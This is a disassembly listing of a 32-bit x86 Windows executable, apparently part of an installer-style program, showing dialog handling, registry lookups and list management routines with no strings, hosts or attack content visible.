  403a3a:	68 00 50 43 00       	push   $0x435000
  403a3f:	e8 3e 2c 00 00       	call   0x406682
  403a44:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  403a48:	83 0d 0c 9b 42 00 ff 	orl    $0xffffffff,0x429b0c
  403a4f:	e8 00 03 00 00       	call   0x403d54
  403a54:	89 44 24 20          	mov    %eax,0x20(%esp)
  403a58:	e9 33 01 00 00       	jmp    0x403b90
  403a5d:	e8 eb 21 00 00       	call   0x405c4d
  403a62:	56                   	push   %esi
  403a63:	89 44 24 28          	mov    %eax,0x28(%esp)
  403a67:	e8 2c 2c 00 00       	call   0x406698
  403a6c:	ff 74 24 1c          	push   0x1c(%esp)
  403a70:	8b f8                	mov    %eax,%edi
  403a72:	68 00 a0 42 00       	push   $0x42a000
  403a77:	e8 06 2c 00 00       	call   0x406682
  403a7c:	66 39 2d 00 48 43 00 	cmp    %bp,0x434800
  403a83:	75 0f                	jne    0x403a94
  403a85:	68 00 58 43 00       	push   $0x435800
  403a8a:	68 00 48 43 00       	push   $0x434800
  403a8f:	e8 ee 2b 00 00       	call   0x406682
  403a94:	8d 04 7d 00 68 43 00 	lea    0x436800(,%edi,2),%eax
  403a9b:	c7 44 24 14 01 00 00 	movl   $0x1,0x14(%esp)
  403aa2:	00 
  403aa3:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  403aa7:	bf 00 c8 42 00       	mov    $0x42c800,%edi
  403aac:	bb 00 d0 42 00       	mov    $0x42d000,%ebx
  403ab1:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  403ab5:	0f b7 6c 24 14       	movzwl 0x14(%esp),%ebp
  403aba:	55                   	push   %ebp
  403abb:	68 14 a3 40 00       	push   $0x40a314
  403ac0:	ff 74 24 24          	push   0x24(%esp)
  403ac4:	ff 15 2c 82 40 00    	call   *0x40822c
  403aca:	a1 70 9a 42 00       	mov    0x429a70,%eax
  403acf:	83 c4 0c             	add    $0xc,%esp
  403ad2:	ff b0 20 01 00 00    	push   0x120(%eax)
  403ad8:	57                   	push   %edi
  403ad9:	e8 e1 2b 00 00       	call   0x4066bf
  403ade:	83 7c 24 24 00       	cmpl   $0x0,0x24(%esp)
  403ae3:	56                   	push   %esi
  403ae4:	74 07                	je     0x403aed
  403ae6:	e8 eb 20 00 00       	call   0x405bd6
  403aeb:	eb 05                	jmp    0x403af2
  403aed:	e8 3e 21 00 00       	call   0x405c30
  403af2:	85 c0                	test   %eax,%eax
  403af4:	74 3a                	je     0x403b30
  403af6:	57                   	push   %edi
  403af7:	ff 15 dc 80 40 00    	call   *0x4080dc
  403afd:	f6 c4 04             	test   $0x4,%ah
  403b00:	75 1f                	jne    0x403b21
  403b02:	57                   	push   %edi
  403b03:	ff 15 44 81 40 00    	call   *0x408144
  403b09:	85 c0                	test   %eax,%eax
  403b0b:	74 14                	je     0x403b21
  403b0d:	6a 01                	push   $0x1
  403b0f:	56                   	push   %esi
  403b10:	e8 79 22 00 00       	call   0x405d8e
  403b15:	8b 44 24 10          	mov    0x10(%esp),%eax
  403b19:	ff 44 24 10          	incl   0x10(%esp)
  403b1d:	85 c0                	test   %eax,%eax
  403b1f:	74 99                	je     0x403aba
  403b21:	ff 44 24 14          	incl   0x14(%esp)
  403b25:	33 ed                	xor    %ebp,%ebp
  403b27:	66 39 6c 24 14       	cmp    %bp,0x14(%esp)
  403b2c:	75 83                	jne    0x403ab1
  403b2e:	eb 60                	jmp    0x403b90
  403b30:	56                   	push   %esi
  403b31:	ff 15 e0 80 40 00    	call   *0x4080e0
  403b37:	6a 00                	push   $0x0
  403b39:	56                   	push   %esi
  403b3a:	e8 03 29 00 00       	call   0x406442
  403b3f:	6a 01                	push   $0x1
  403b41:	57                   	push   %edi
  403b42:	68 00 78 43 00       	push   $0x437800
  403b47:	ff 15 6c 81 40 00    	call   *0x40816c
  403b4d:	85 c0                	test   %eax,%eax
  403b4f:	74 3d                	je     0x403b8e
  403b51:	6a 00                	push   $0x0
  403b53:	57                   	push   %edi
  403b54:	e8 e9 28 00 00       	call   0x406442
  403b59:	a1 70 9a 42 00       	mov    0x429a70,%eax
  403b5e:	ff b0 24 01 00 00    	push   0x124(%eax)
  403b64:	53                   	push   %ebx
  403b65:	e8 55 2b 00 00       	call   0x4066bf
  403b6a:	53                   	push   %ebx
  403b6b:	e8 f5 20 00 00       	call   0x405c65
  403b70:	85 c0                	test   %eax,%eax
  403b72:	75 44                	jne    0x403bb8
  403b74:	8b 44 24 10          	mov    0x10(%esp),%eax
  403b78:	ff 44 24 10          	incl   0x10(%esp)
  403b7c:	85 c0                	test   %eax,%eax
  403b7e:	75 0e                	jne    0x403b8e
  403b80:	57                   	push   %edi
  403b81:	e8 59 2e 00 00       	call   0x4069df
  403b86:	85 c0                	test   %eax,%eax
  403b88:	0f 84 2c ff ff ff    	je     0x403aba
  403b8e:	33 ed                	xor    %ebp,%ebp
  403b90:	e8 cd 00 00 00       	call   0x403c62
  403b95:	ff 15 94 82 40 00    	call   *0x408294
  403b9b:	39 6c 24 18          	cmp    %ebp,0x18(%esp)
  403b9f:	5b                   	pop    %ebx
  403ba0:	74 24                	je     0x403bc6
  403ba2:	68 10 00 20 00       	push   $0x200010
  403ba7:	ff 74 24 18          	push   0x18(%esp)
  403bab:	e8 32 21 00 00       	call   0x405ce2
  403bb0:	6a 02                	push   $0x2
  403bb2:	ff 15 bc 80 40 00    	call   *0x4080bc
  403bb8:	50                   	push   %eax
  403bb9:	ff 15 fc 80 40 00    	call   *0x4080fc
  403bbf:	83 64 24 18 00       	andl   $0x0,0x18(%esp)
  403bc4:	eb c8                	jmp    0x403b8e
  403bc6:	39 2d f4 9a 42 00    	cmp    %ebp,0x429af4
  403bcc:	74 7c                	je     0x403c4a
  403bce:	8d 44 24 20          	lea    0x20(%esp),%eax
  403bd2:	50                   	push   %eax
  403bd3:	6a 28                	push   $0x28
  403bd5:	ff 15 c0 80 40 00    	call   *0x4080c0
  403bdb:	50                   	push   %eax
  403bdc:	ff 15 24 80 40 00    	call   *0x408024
  403be2:	85 c0                	test   %eax,%eax
  403be4:	74 34                	je     0x403c1a
  403be6:	8d 44 24 28          	lea    0x28(%esp),%eax
  403bea:	50                   	push   %eax
  403beb:	68 ec a2 40 00       	push   $0x40a2ec
  403bf0:	55                   	push   %ebp
  403bf1:	ff 15 20 80 40 00    	call   *0x408020
  403bf7:	55                   	push   %ebp
  403bf8:	55                   	push   %ebp
  403bf9:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  403bfd:	55                   	push   %ebp
  403bfe:	50                   	push   %eax
  403bff:	55                   	push   %ebp
  403c00:	ff 74 24 34          	push   0x34(%esp)
  403c04:	c7 44 24 3c 01 00 00 	movl   $0x1,0x3c(%esp)
  403c0b:	00 
  403c0c:	c7 44 24 48 02 00 00 	movl   $0x2,0x48(%esp)
  403c13:	00 
  403c14:	ff 15 1c 80 40 00    	call   *0x40801c
  403c1a:	6a 04                	push   $0x4
  403c1c:	e8 55 2e 00 00       	call   0x406a76
  403c21:	3b c5                	cmp    %ebp,%eax
  403c23:	be 02 00 04 80       	mov    $0x80040002,%esi
  403c28:	74 0c                	je     0x403c36
  403c2a:	56                   	push   %esi
  403c2b:	6a 25                	push   $0x25
  403c2d:	55                   	push   %ebp
  403c2e:	55                   	push   %ebp
  403c2f:	55                   	push   %ebp
  403c30:	ff d0                	call   *%eax
  403c32:	85 c0                	test   %eax,%eax
  403c34:	74 0d                	je     0x403c43
  403c36:	56                   	push   %esi
  403c37:	6a 02                	push   $0x2
  403c39:	ff 15 0c 82 40 00    	call   *0x40820c
  403c3f:	85 c0                	test   %eax,%eax
  403c41:	75 07                	jne    0x403c4a
  403c43:	6a 09                	push   $0x9
  403c45:	e8 c1 d7 ff ff       	call   0x40140b
  403c4a:	a1 0c 9b 42 00       	mov    0x429b0c,%eax
  403c4f:	83 f8 ff             	cmp    $0xffffffff,%eax
  403c52:	74 04                	je     0x403c58
  403c54:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  403c58:	ff 74 24 1c          	push   0x1c(%esp)
  403c5c:	ff 15 bc 80 40 00    	call   *0x4080bc
  403c62:	a1 18 a0 40 00       	mov    0x40a018,%eax
  403c67:	56                   	push   %esi
  403c68:	8b 35 fc 80 40 00    	mov    0x4080fc,%esi
  403c6e:	83 f8 ff             	cmp    $0xffffffff,%eax
  403c71:	74 0a                	je     0x403c7d
  403c73:	50                   	push   %eax
  403c74:	ff d6                	call   *%esi
  403c76:	83 0d 18 a0 40 00 ff 	orl    $0xffffffff,0x40a018
  403c7d:	a1 1c a0 40 00       	mov    0x40a01c,%eax
  403c82:	83 f8 ff             	cmp    $0xffffffff,%eax
  403c85:	74 0a                	je     0x403c91
  403c87:	50                   	push   %eax
  403c88:	ff d6                	call   *%esi
  403c8a:	83 0d 1c a0 40 00 ff 	orl    $0xffffffff,0x40a01c
  403c91:	e8 29 00 00 00       	call   0x403cbf
  403c96:	6a 07                	push   $0x7
  403c98:	68 00 70 43 00       	push   $0x437000
  403c9d:	e8 ec 20 00 00       	call   0x405d8e
  403ca2:	5e                   	pop    %esi
  403ca3:	c3                   	ret
  403ca4:	56                   	push   %esi
  403ca5:	8b 35 0c 0f 42 00    	mov    0x420f0c,%esi
  403cab:	eb 0a                	jmp    0x403cb7
  403cad:	ff 74 24 08          	push   0x8(%esp)
  403cb1:	ff 56 04             	call   *0x4(%esi)
  403cb4:	8b 36                	mov    (%esi),%esi
  403cb6:	59                   	pop    %ecx
  403cb7:	85 f6                	test   %esi,%esi
  403cb9:	75 f2                	jne    0x403cad
  403cbb:	5e                   	pop    %esi
  403cbc:	c2 04 00             	ret    $0x4
  403cbf:	56                   	push   %esi
  403cc0:	8b 35 0c 0f 42 00    	mov    0x420f0c,%esi
  403cc6:	6a 00                	push   $0x0
  403cc8:	e8 d7 ff ff ff       	call   0x403ca4
  403ccd:	85 f6                	test   %esi,%esi
  403ccf:	74 1a                	je     0x403ceb
  403cd1:	57                   	push   %edi
  403cd2:	8b fe                	mov    %esi,%edi
  403cd4:	8b 36                	mov    (%esi),%esi
  403cd6:	ff 77 08             	push   0x8(%edi)
  403cd9:	ff 15 1c 81 40 00    	call   *0x40811c
  403cdf:	57                   	push   %edi
  403ce0:	ff 15 0c 81 40 00    	call   *0x40810c
  403ce6:	85 f6                	test   %esi,%esi
  403ce8:	75 e8                	jne    0x403cd2
  403cea:	5f                   	pop    %edi
  403ceb:	83 25 0c 0f 42 00 00 	andl   $0x0,0x420f0c
  403cf2:	5e                   	pop    %esi
  403cf3:	c3                   	ret
  403cf4:	a1 0c 0f 42 00       	mov    0x420f0c,%eax
  403cf9:	eb 0b                	jmp    0x403d06
  403cfb:	8b 48 08             	mov    0x8(%eax),%ecx
  403cfe:	3b 4c 24 04          	cmp    0x4(%esp),%ecx
  403d02:	74 0a                	je     0x403d0e
  403d04:	8b 00                	mov    (%eax),%eax
  403d06:	85 c0                	test   %eax,%eax
  403d08:	75 f1                	jne    0x403cfb
  403d0a:	40                   	inc    %eax
  403d0b:	c2 04 00             	ret    $0x4
  403d0e:	33 c0                	xor    %eax,%eax
  403d10:	eb f9                	jmp    0x403d0b
  403d12:	56                   	push   %esi
  403d13:	8b 74 24 08          	mov    0x8(%esp),%esi
  403d17:	56                   	push   %esi
  403d18:	e8 d7 ff ff ff       	call   0x403cf4
  403d1d:	85 c0                	test   %eax,%eax
  403d1f:	75 03                	jne    0x403d24
  403d21:	40                   	inc    %eax
  403d22:	eb 2c                	jmp    0x403d50
  403d24:	6a 0c                	push   $0xc
  403d26:	6a 40                	push   $0x40
  403d28:	ff 15 10 81 40 00    	call   *0x408110
  403d2e:	85 c0                	test   %eax,%eax
  403d30:	74 1b                	je     0x403d4d
  403d32:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  403d36:	89 70 08             	mov    %esi,0x8(%eax)
  403d39:	89 48 04             	mov    %ecx,0x4(%eax)
  403d3c:	8b 0d 0c 0f 42 00    	mov    0x420f0c,%ecx
  403d42:	89 08                	mov    %ecx,(%eax)
  403d44:	a3 0c 0f 42 00       	mov    %eax,0x420f0c
  403d49:	33 c0                	xor    %eax,%eax
  403d4b:	eb 03                	jmp    0x403d50
  403d4d:	83 c8 ff             	or     $0xffffffff,%eax
  403d50:	5e                   	pop    %esi
  403d51:	c2 08 00             	ret    $0x8
  403d54:	83 ec 10             	sub    $0x10,%esp
  403d57:	53                   	push   %ebx
  403d58:	55                   	push   %ebp
  403d59:	56                   	push   %esi
  403d5a:	8b 35 70 9a 42 00    	mov    0x429a70,%esi
  403d60:	57                   	push   %edi
  403d61:	6a 02                	push   $0x2
  403d63:	e8 0e 2d 00 00       	call   0x406a76
  403d68:	33 ff                	xor    %edi,%edi
  403d6a:	3b c7                	cmp    %edi,%eax
  403d6c:	74 12                	je     0x403d80
  403d6e:	ff d0                	call   *%eax
  403d70:	0f b7 c0             	movzwl %ax,%eax
  403d73:	50                   	push   %eax
  403d74:	68 00 60 43 00       	push   $0x436000
  403d79:	e8 4b 28 00 00       	call   0x4065c9
  403d7e:	eb 5a                	jmp    0x403dda
  403d80:	bb 48 2f 42 00       	mov    $0x422f48,%ebx
  403d85:	57                   	push   %edi
  403d86:	53                   	push   %ebx
  403d87:	57                   	push   %edi
  403d88:	68 90 83 40 00       	push   $0x408390
  403d8d:	68 01 00 00 80       	push   $0x80000001
  403d92:	66 c7 05 00 60 43 00 	movw   $0x30,0x436000
  403d99:	30 00 
  403d9b:	66 c7 05 02 60 43 00 	movw   $0x78,0x436002
  403da2:	78 00 
  403da4:	66 89 3d 04 60 43 00 	mov    %di,0x436004
  403dab:	e8 a0 27 00 00       	call   0x406550
  403db0:	66 39 3d 48 2f 42 00 	cmp    %di,0x422f48
  403db7:	75 16                	jne    0x403dcf
  403db9:	57                   	push   %edi
  403dba:	53                   	push   %ebx
  403dbb:	68 cc 83 40 00       	push   $0x4083cc
  403dc0:	68 40 83 40 00       	push   $0x408340
  403dc5:	68 03 00 00 80       	push   $0x80000003
  403dca:	e8 81 27 00 00       	call   0x406550
  403dcf:	53                   	push   %ebx
  403dd0:	68 00 60 43 00       	push   $0x436000
  403dd5:	e8 c4 28 00 00       	call   0x40669e
  403dda:	e8 4b 02 00 00       	call   0x40402a
  403ddf:	a1 78 9a 42 00       	mov    0x429a78,%eax
  403de4:	bd 00 48 43 00       	mov    $0x434800,%ebp
  403de9:	83 e0 20             	and    $0x20,%eax
  403dec:	55                   	push   %ebp
  403ded:	a3 e0 9a 42 00       	mov    %eax,0x429ae0
  403df2:	c7 05 fc 9a 42 00 00 	movl   $0x10000,0x429afc
  403df9:	00 01 00 
  403dfc:	e8 58 22 00 00       	call   0x406059
  403e01:	85 c0                	test   %eax,%eax
  403e03:	0f 85 8c 00 00 00    	jne    0x403e95
  403e09:	8b 4e 48             	mov    0x48(%esi),%ecx
  403e0c:	3b cf                	cmp    %edi,%ecx
  403e0e:	0f 84 81 00 00 00    	je     0x403e95
  403e14:	8b 56 4c             	mov    0x4c(%esi),%edx
  403e17:	a1 98 9a 42 00       	mov    0x429a98,%eax
  403e1c:	bb 00 7a 42 00       	mov    $0x427a00,%ebx
  403e21:	57                   	push   %edi
  403e22:	8d 14 50             	lea    (%eax,%edx,2),%edx
  403e25:	53                   	push   %ebx
  403e26:	8d 04 48             	lea    (%eax,%ecx,2),%eax
  403e29:	52                   	push   %edx
  403e2a:	50                   	push   %eax
  403e2b:	ff 76 44             	push   0x44(%esi)
  403e2e:	e8 1d 27 00 00       	call   0x406550
  403e33:	66 a1 00 7a 42 00    	mov    0x427a00,%ax
  403e39:	66 3b c7             	cmp    %di,%ax
  403e3c:	74 57                	je     0x403e95
  403e3e:	66 3d 22 00          	cmp    $0x22,%ax
  403e42:	75 10                	jne    0x403e54
  403e44:	bb 02 7a 42 00       	mov    $0x427a02,%ebx
  403e49:	6a 22                	push   $0x22
  403e4b:	53                   	push   %ebx
  403e4c:	e8 2d 21 00 00       	call   0x405f7e
  403e51:	66 89 38             	mov    %di,(%eax)
  403e54:	53                   	push   %ebx
  403e55:	e8 3e 28 00 00       	call   0x406698
  403e5a:	8d 44 43 f8          	lea    -0x8(%ebx,%eax,2),%eax
  403e5e:	3b c3                	cmp    %ebx,%eax
  403e60:	76 26                	jbe    0x403e88
  403e62:	68 b0 a3 40 00       	push   $0x40a3b0
  403e67:	50                   	push   %eax
  403e68:	ff 15 00 81 40 00    	call   *0x408100
  403e6e:	85 c0                	test   %eax,%eax
  403e70:	75 16                	jne    0x403e88
  403e72:	53                   	push   %ebx
  403e73:	ff 15 dc 80 40 00    	call   *0x4080dc
  403e79:	83 f8 ff             	cmp    $0xffffffff,%eax
  403e7c:	74 04                	je     0x403e82
  403e7e:	a8 10                	test   $0x10,%al
  403e80:	75 06                	jne    0x403e88
  403e82:	53                   	push   %ebx
  403e83:	e8 15 21 00 00       	call   0x405f9d
  403e88:	53                   	push   %ebx
  403e89:	e8 c3 20 00 00       	call   0x405f51
  403e8e:	50                   	push   %eax
  403e8f:	55                   	push   %ebp
  403e90:	e8 ed 27 00 00       	call   0x406682
  403e95:	55                   	push   %ebp
  403e96:	e8 be 21 00 00       	call   0x406059
  403e9b:	85 c0                	test   %eax,%eax
  403e9d:	75 0c                	jne    0x403eab
  403e9f:	ff b6 18 01 00 00    	push   0x118(%esi)
  403ea5:	55                   	push   %ebp
  403ea6:	e8 14 28 00 00       	call   0x4066bf
  403eab:	68 40 80 00 00       	push   $0x8040
  403eb0:	57                   	push   %edi
  403eb1:	57                   	push   %edi
  403eb2:	6a 01                	push   $0x1
  403eb4:	6a 67                	push   $0x67
  403eb6:	ff 35 60 9a 42 00    	push   0x429a60
  403ebc:	ff 15 44 82 40 00    	call   *0x408244
  403ec2:	a3 48 8a 42 00       	mov    %eax,0x428a48
  403ec7:	83 7e 50 ff          	cmpl   $0xffffffff,0x50(%esi)
  403ecb:	bb 00 8a 42 00       	mov    $0x428a00,%ebx
  403ed0:	74 7f                	je     0x403f51
  403ed2:	8b 0d 60 9a 42 00    	mov    0x429a60,%ecx
  403ed8:	be a8 a3 40 00       	mov    $0x40a3a8,%esi
  403edd:	53                   	push   %ebx
  403ede:	c7 05 04 8a 42 00 00 	movl   $0x401000,0x428a04
  403ee5:	10 40 00 
  403ee8:	89 0d 10 8a 42 00    	mov    %ecx,0x428a10
  403eee:	a3 14 8a 42 00       	mov    %eax,0x428a14
  403ef3:	89 35 24 8a 42 00    	mov    %esi,0x428a24
  403ef9:	ff 15 f4 81 40 00    	call   *0x4081f4
  403eff:	66 85 c0             	test   %ax,%ax
  403f02:	0f 84 18 01 00 00    	je     0x404020
  403f08:	8d 44 24 10          	lea    0x10(%esp),%eax
  403f0c:	57                   	push   %edi
  403f0d:	50                   	push   %eax
  403f0e:	57                   	push   %edi
  403f0f:	6a 30                	push   $0x30
  403f11:	ff 15 f8 81 40 00    	call   *0x4081f8
  403f17:	57                   	push   %edi
  403f18:	ff 35 60 9a 42 00    	push   0x429a60
  403f1e:	8b 44 24 24          	mov    0x24(%esp),%eax
  403f22:	2b 44 24 1c          	sub    0x1c(%esp),%eax
  403f26:	57                   	push   %edi
  403f27:	57                   	push   %edi
  403f28:	50                   	push   %eax
  403f29:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403f2d:	2b 44 24 24          	sub    0x24(%esp),%eax
  403f31:	50                   	push   %eax
  403f32:	ff 74 24 2c          	push   0x2c(%esp)
  403f36:	ff 74 24 2c          	push   0x2c(%esp)
  403f3a:	68 00 00 00 80       	push   $0x80000000
  403f3f:	57                   	push   %edi
  403f40:	56                   	push   %esi
  403f41:	68 80 00 00 00       	push   $0x80
  403f46:	ff 15 80 82 40 00    	call   *0x408280
  403f4c:	a3 28 2f 42 00       	mov    %eax,0x422f28
  403f51:	57                   	push   %edi
  403f52:	e8 b4 d4 ff ff       	call   0x40140b
  403f57:	85 c0                	test   %eax,%eax
  403f59:	74 08                	je     0x403f63
  403f5b:	6a 02                	push   $0x2
  403f5d:	58                   	pop    %eax
  403f5e:	e9 bf 00 00 00       	jmp    0x404022
  403f63:	e8 c2 00 00 00       	call   0x40402a
  403f68:	39 3d 00 9b 42 00    	cmp    %edi,0x429b00
  403f6e:	0f 85 83 00 00 00    	jne    0x403ff7
  403f74:	6a 05                	push   $0x5
  403f76:	ff 35 28 2f 42 00    	push   0x422f28
  403f7c:	ff 15 28 82 40 00    	call   *0x408228
  403f82:	68 34 83 40 00       	push   $0x408334
  403f87:	e8 7a 2a 00 00       	call   0x406a06
  403f8c:	85 c0                	test   %eax,%eax
  403f8e:	75 0a                	jne    0x403f9a
  403f90:	68 28 83 40 00       	push   $0x408328
  403f95:	e8 6c 2a 00 00       	call   0x406a06
  403f9a:	8b 35 00 82 40 00    	mov    0x408200,%esi
  403fa0:	bd 10 83 40 00       	mov    $0x408310,%ebp
  403fa5:	53                   	push   %ebx
  403fa6:	55                   	push   %ebp
  403fa7:	57                   	push   %edi
  403fa8:	ff d6                	call   *%esi
  403faa:	85 c0                	test   %eax,%eax
  403fac:	75 16                	jne    0x403fc4
  403fae:	53                   	push   %ebx
  403faf:	68 fc 82 40 00       	push   $0x4082fc
  403fb4:	57                   	push   %edi
  403fb5:	ff d6                	call   *%esi
  403fb7:	53                   	push   %ebx
  403fb8:	89 2d 24 8a 42 00    	mov    %ebp,0x428a24
  403fbe:	ff 15 f4 81 40 00    	call   *0x4081f4
  403fc4:	a1 40 8a 42 00       	mov    0x428a40,%eax
  403fc9:	57                   	push   %edi
  403fca:	83 c0 69             	add    $0x69,%eax
  403fcd:	68 02 41 40 00       	push   $0x404102
  403fd2:	0f b7 c0             	movzwl %ax,%eax
  403fd5:	57                   	push   %edi
  403fd6:	50                   	push   %eax
  403fd7:	ff 35 60 9a 42 00    	push   0x429a60
  403fdd:	ff 15 04 82 40 00    	call   *0x408204
  403fe3:	6a 05                	push   $0x5
  403fe5:	8b f0                	mov    %eax,%esi
  403fe7:	e8 1f d4 ff ff       	call   0x40140b
  403fec:	6a 01                	push   $0x1
  403fee:	e8 b1 fc ff ff       	call   0x403ca4
  403ff3:	8b c6                	mov    %esi,%eax
  403ff5:	eb 2b                	jmp    0x404022
  403ff7:	57                   	push   %edi
  403ff8:	e8 dd 17 00 00       	call   0x4057da
  403ffd:	85 c0                	test   %eax,%eax
  403fff:	74 18                	je     0x404019
  404001:	39 3d 2c 8a 42 00    	cmp    %edi,0x428a2c
  404007:	0f 85 4e ff ff ff    	jne    0x403f5b
  40400d:	6a 02                	push   $0x2
  40400f:	e8 f7 d3 ff ff       	call   0x40140b
  404014:	e9 42 ff ff ff       	jmp    0x403f5b
  404019:	6a 01                	push   $0x1
  40401b:	e8 eb d3 ff ff       	call   0x40140b
  404020:	33 c0                	xor    %eax,%eax
  404022:	5f                   	pop    %edi
  404023:	5e                   	pop    %esi
  404024:	5d                   	pop    %ebp
  404025:	5b                   	pop    %ebx
  404026:	83 c4 10             	add    $0x10,%esp
  404029:	c3                   	ret
  40402a:	53                   	push   %ebx
  40402b:	55                   	push   %ebp
  40402c:	56                   	push   %esi
  40402d:	57                   	push   %edi
  40402e:	bf 00 60 43 00       	mov    $0x436000,%edi
  404033:	bb ff ff 00 00       	mov    $0xffff,%ebx
  404038:	57                   	push   %edi
  404039:	e8 a4 25 00 00       	call   0x4065e2
  40403e:	8b 35 a4 9a 42 00    	mov    0x429aa4,%esi
  404044:	85 f6                	test   %esi,%esi
  404046:	74 45                	je     0x40408d
  404048:	8b 0d 70 9a 42 00    	mov    0x429a70,%ecx
  40404e:	8b 49 64             	mov    0x64(%ecx),%ecx
  404051:	8b d1                	mov    %ecx,%edx
  404053:	0f af ce             	imul   %esi,%ecx
  404056:	f7 da                	neg    %edx
  404058:	03 0d a0 9a 42 00    	add    0x429aa0,%ecx
  40405e:	03 ca                	add    %edx,%ecx
  404060:	4e                   	dec    %esi
  404061:	66 8b 29             	mov    (%ecx),%bp
  404064:	66 33 e8             	xor    %ax,%bp
  404067:	23 eb                	and    %ebx,%ebp
  404069:	66 85 ed             	test   %bp,%bp
  40406c:	74 06                	je     0x404074
  40406e:	85 f6                	test   %esi,%esi
  404070:	75 ec                	jne    0x40405e
  404072:	eb 19                	jmp    0x40408d
  404074:	8b 51 02             	mov    0x2(%ecx),%edx
  404077:	89 15 40 8a 42 00    	mov    %edx,0x428a40
  40407d:	8b 51 06             	mov    0x6(%ecx),%edx
  404080:	89 15 08 9b 42 00    	mov    %edx,0x429b08
  404086:	8d 51 0a             	lea    0xa(%ecx),%edx
  404089:	85 d2                	test   %edx,%edx
  40408b:	75 12                	jne    0x40409f
  40408d:	66 81 fb ff ff       	cmp    $0xffff,%bx
  404092:	75 07                	jne    0x40409b
  404094:	bb ff 03 00 00       	mov    $0x3ff,%ebx
  404099:	eb a3                	jmp    0x40403e
  40409b:	33 db                	xor    %ebx,%ebx
  40409d:	eb 9f                	jmp    0x40403e
  40409f:	89 15 3c 8a 42 00    	mov    %edx,0x428a3c
  4040a5:	0f b7 01             	movzwl (%ecx),%eax
  4040a8:	50                   	push   %eax
  4040a9:	57                   	push   %edi
  4040aa:	e8 1a 25 00 00       	call   0x4065c9
  4040af:	e8 2f 00 00 00       	call   0x4040e3
  4040b4:	a1 8c 9a 42 00       	mov    0x429a8c,%eax
  4040b9:	8b 35 88 9a 42 00    	mov    0x429a88,%esi
  4040bf:	85 c0                	test   %eax,%eax
  4040c1:	74 1b                	je     0x4040de
  4040c3:	8b f8                	mov    %eax,%edi
  4040c5:	8b 06                	mov    (%esi),%eax
  4040c7:	85 c0                	test   %eax,%eax
  4040c9:	74 0a                	je     0x4040d5
  4040cb:	50                   	push   %eax
  4040cc:	8d 46 18             	lea    0x18(%esi),%eax
  4040cf:	50                   	push   %eax
  4040d0:	e8 ea 25 00 00       	call   0x4066bf
  4040d5:	81 c6 18 08 00 00    	add    $0x818,%esi
  4040db:	4f                   	dec    %edi
  4040dc:	75 e7                	jne    0x4040c5
  4040de:	5f                   	pop    %edi
  4040df:	5e                   	pop    %esi
  4040e0:	5d                   	pop    %ebp
  4040e1:	5b                   	pop    %ebx
  4040e2:	c3                   	ret
  4040e3:	56                   	push   %esi
  4040e4:	be 60 8a 42 00       	mov    $0x428a60,%esi
  4040e9:	6a fe                	push   $0xfffffffe
  4040eb:	56                   	push   %esi
  4040ec:	e8 ce 25 00 00       	call   0x4066bf
  4040f1:	56                   	push   %esi
  4040f2:	ff 35 28 2f 42 00    	push   0x422f28
  4040f8:	ff 15 1c 82 40 00    	call   *0x40821c
  4040fe:	8b c6                	mov    %esi,%eax
  404100:	5e                   	pop    %esi
  404101:	c3                   	ret
  404102:	83 ec 10             	sub    $0x10,%esp
  404105:	b9 10 01 00 00       	mov    $0x110,%ecx
  40410a:	53                   	push   %ebx
  40410b:	55                   	push   %ebp
  40410c:	56                   	push   %esi
  40410d:	8b 74 24 24          	mov    0x24(%esp),%esi
  404111:	3b f1                	cmp    %ecx,%esi
  404113:	57                   	push   %edi
  404114:	0f 84 61 01 00 00    	je     0x40427b
  40411a:	81 fe 08 04 00 00    	cmp    $0x408,%esi
  404120:	0f 84 55 01 00 00    	je     0x40427b
  404126:	8b 7c 24 24          	mov    0x24(%esp),%edi
  40412a:	33 ed                	xor    %ebp,%ebp
  40412c:	83 fe 47             	cmp    $0x47,%esi
  40412f:	75 13                	jne    0x404144
  404131:	6a 13                	push   $0x13
  404133:	55                   	push   %ebp
  404134:	55                   	push   %ebp
  404135:	55                   	push   %ebp
  404136:	55                   	push   %ebp
  404137:	57                   	push   %edi
  404138:	ff 35 28 2f 42 00    	push   0x422f28
  40413e:	ff 15 d0 81 40 00    	call   *0x4081d0
  404144:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  404148:	83 fe 05             	cmp    $0x5,%esi
  40414b:	75 42                	jne    0x40418f
  40414d:	8b c3                	mov    %ebx,%eax
  40414f:	48                   	dec    %eax
  404150:	f7 d8                	neg    %eax
  404152:	1b c0                	sbb    %eax,%eax
  404154:	83 e0 05             	and    $0x5,%eax
  404157:	50                   	push   %eax
  404158:	ff 35 28 2f 42 00    	push   0x422f28
  40415e:	ff 15 28 82 40 00    	call   *0x408228
  404164:	83 fb 02             	cmp    $0x2,%ebx
  404167:	0f 85 fb 00 00 00    	jne    0x404268
  40416d:	6a f0                	push   $0xfffffff0
  40416f:	57                   	push   %edi
  404170:	ff 15 d4 81 40 00    	call   *0x4081d4
  404176:	25 00 00 01 21       	and    $0x21010000,%eax
  40417b:	3d 00 00 00 01       	cmp    $0x1000000,%eax
  404180:	0f 85 e2 00 00 00    	jne    0x404268
  404186:	6a 04                	push   $0x4
  404188:	57                   	push   %edi
  404189:	ff 15 28 82 40 00    	call   *0x408228
  40418f:	81 fe 0d 04 00 00    	cmp    $0x40d,%esi
  404195:	75 17                	jne    0x4041ae
  404197:	ff 35 38 8a 42 00    	push   0x428a38
  40419d:	ff 15 10 82 40 00    	call   *0x408210
  4041a3:	89 1d 38 8a 42 00    	mov    %ebx,0x428a38
  4041a9:	e9 fd 03 00 00       	jmp    0x4045ab
  4041ae:	83 fe 11             	cmp    $0x11,%esi
  4041b1:	75 11                	jne    0x4041c4
  4041b3:	55                   	push   %ebp
  4041b4:	55                   	push   %ebp
  4041b5:	57                   	push   %edi
  4041b6:	ff 15 40 82 40 00    	call   *0x408240
  4041bc:	33 c0                	xor    %eax,%eax
  4041be:	40                   	inc    %eax
  4041bf:	e9 0c 04 00 00       	jmp    0x4045d0
  4041c4:	81 fe 11 01 00 00    	cmp    $0x111,%esi
  4041ca:	0f 85 98 00 00 00    	jne    0x404268
  4041d0:	0f b7 f3             	movzwl %bx,%esi
  4041d3:	56                   	push   %esi
  4041d4:	57                   	push   %edi
